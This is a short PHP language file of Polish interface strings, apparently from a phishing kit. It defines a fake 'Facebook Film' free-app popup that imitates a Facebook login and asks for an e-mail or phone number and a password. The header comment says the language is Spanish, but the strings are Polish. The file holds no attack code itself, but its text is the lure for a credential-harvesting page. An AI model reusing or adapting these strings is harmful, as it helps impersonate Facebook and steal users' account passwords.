<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'pl';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Aplikacja Facebook';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Film aplikacja (Darmowy)';
$lang['POPUP_DESCRIPCION'] = '¿ZAPOMNIJ HASŁO?';
$lang['POPUP_CORREO'] = 'E-mail lub numer telefonu';
$lang['POPUP_CONTRASENA'] = 'Haslo';
$lang['POPUP_SUBMIT'] = 'ZALOGUJ SIE';
$lang['POPUP_CANDADO'] = 'Ta aplikacja nie jest dozwolone do publikacji na Facebooku.';

/*
$langPl = array("Poland")
*/